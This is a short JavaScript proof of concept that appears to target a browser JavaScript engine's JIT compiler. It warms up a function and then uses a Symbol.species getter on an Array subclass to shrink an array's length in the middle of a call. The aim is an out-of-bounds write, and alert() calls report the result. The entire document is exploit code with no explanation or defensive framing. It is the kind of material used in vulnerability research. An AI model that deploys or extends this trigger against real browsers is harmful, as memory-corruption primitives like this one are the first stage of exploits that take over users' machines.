let Trigger = false;
let Arr = null;

function Target(Special, Idx, Value) {
    Arr[Idx] = 0x41414141;
    Special.slice();
    Arr[Idx] = Value;
    //alert('Target called, Arr[' + Idx + '] = ' + Arr[Idx].toString(16));
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if (Trigger) {
                Arr.length = 0;
                alert('Length set to 0 by Symbol.species, Arr.length = ' + Arr.length);
                let temp = new Array(1000000).fill(0);
            }
        };
    }
};

function main() {
    const Snowflake = new SoSpecial();
    Arr = new Array(0x21);
    Arr.fill(0);
    for (let Idx = 0; Idx < 0x400; Idx++) {
        Target(Snowflake, 0, Idx);
    }
    Trigger = true;
    Target(Snowflake, 0x20, 0xBB);
    alert('Final Arr[0x20] = ' + Arr[0x20].toString(16));
    alert('Arr.length = ' + Arr.length); // مراقبة الطول النهائي
}

main();